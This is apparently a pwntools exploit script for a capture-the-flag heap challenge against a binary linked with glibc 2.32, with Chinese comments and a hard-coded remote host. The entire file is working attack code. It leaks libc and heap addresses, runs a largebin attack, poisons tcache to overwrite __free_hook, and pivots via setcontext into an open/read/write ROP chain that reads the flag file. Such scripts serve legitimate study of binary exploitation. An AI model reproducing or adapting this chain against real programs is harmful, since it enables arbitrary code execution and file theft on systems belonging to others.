from pwn import * 
from pwn import p64,u64


debug = 1
gdb_is = 1
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['wt.exe','nt','Ubuntu','-c']
    if gdb_is:
        r = gdb.debug('./vuln','set debug-file-directory ./.debug/')
        # gdb.attach(r,'b* 0x4012ed')
        # gdb.attach(r)
        # pause()
        pass
    else:
        r = process("./vuln")
else:
    host = "182.148.156.200"
    r = connect(host,9135)#远程连接
    gdb_is =0



def show_addr(name,addr):
      info(f'{name} = {hex(addr)}')

def revc_addr(r:process,name, until=b'\x7f',offset = 0)->int:
    if not offset:
        addr = u64(r.recvuntil(until).ljust(8,b'\x00'))
    else:
        addr = u64(r.recvuntil(until)[:offset].ljust(8,b'\x00'))
    show_addr(name,addr)
    return addr



libc = ELF('./libc-2.32.so')
elf = ELF('./vuln')

def add(page , size):
    r.sendlineafter(b'>',b'1')
    r.sendlineafter(b'Index: ', str(page).encode())
    r.sendlineafter(b'Size: ', str(size).encode())

def delete(page):
    r.sendlineafter(b'>',b'2')
    r.sendlineafter(b'Index: ', str(page).encode())

def edit(page , content):
    r.sendlineafter(b'>',b'3')
    r.sendlineafter(b'Index: ', str(page).encode())
    r.sendafter(b'Content: ' , content)

def show(page):
    r.sendlineafter(b'>',b'4')
    r.sendlineafter(b'Index: ', str(page).encode())

# size > 0x500
add(0,0x728)
add(1,0x500)
add(2,0x718)
add(3,0x500)

delete(0)
edit(0,b'A')
show(0)
libc.address = revc_addr(r,'main_arena') - ord('A') - 0x1e3c00
show_addr('libc.address',libc.address)
edit(0,b'\x00')

delete(2)
show(2)
heap_base = revc_addr(r,'heap',b'\n',-1) - 0x290
show_addr('heap_base',heap_base)

add(0,0x728)
add(2,0x718) 
# 泄露完成 打largebins attack 改global_max_fast
#注意大小差距不能太大 要在同一条bins链上
global_max_fast_addr = libc.address + 0x1e6e98
mp_tcachebins_addr = libc.address + 0x1e32d0
delete(0)
add(4,0x738)
delete(2)

show_addr('heap_base',heap_base)

edit(0,p64(libc.address+0x1e40b0) + p64(libc.address+0x1e40b0)+ p64(heap_base+0x290) + p64(mp_tcachebins_addr - 0x20))
show_addr('global_max_fast_addr',global_max_fast_addr)
show_addr('mp_tcachebins_addr',mp_tcachebins_addr)
add(5,0x738)
delete(1)
delete(3)
delete(4)
delete(5)
# fastbin_ptr= libc.address + 0x1e3c00 + 8
# idx=(libc.sym['__free_hook']-fastbin_ptr)/8
# size=idx*0x10+0x20
# show_addr('size',int(size))
# size = 0x6490 size过大 直接global_max_fast改不了
# 改完分配不了内存 malloc(): memory corruption (fast)
#换tcachebins
#打tcache_posioning
add(10,0x900)
add(11,0x900)
delete(10)
delete(11)
# pause()
xor_free_hook = libc.sym['__free_hook'] ^ ((heap_base + 0x3290)>> 12)
edit(11,p64(xor_free_hook))
add(13,0x900)
add(14,0x900)

add(15,0x900)
rdi_context_addr = heap_base + 0x3290 + 0x10
orw_addr = heap_base + 0x3ba0
orw = ROP(libc)
orw.base = orw_addr + 0x8
orw.open(b'flag',0,0)
orw.read(3,heap_base+0x200,0x20)
orw.write(1,heap_base+0x200,0x20)
info(orw.dump())
edit(15,orw.chain()[8:])



gadget = libc.address + 0x000014b760
'''
0x000014b760
mov rdx, qword ptr [rdi + 8] ;
mov qword ptr [rsp], rax ;
call qword ptr [rdx + 0x20]
'''
rop = ROP(libc)

rdi_context = p64(0) + p64(rdi_context_addr) + p64(0)*2 +p64(libc.sym['setcontext']+61)
rdi_context += p64(0) * 15 + p64(orw_addr+0x10) + orw.chain()[:8]
# rop.raw(rdi_context)
info(rop.dump())

edit(14,p64(gadget))
edit(13,rdi_context) #rdi的值
show_addr('__free_hook',libc.sym['__free_hook'])

pause()
delete(13)
r.interactive()
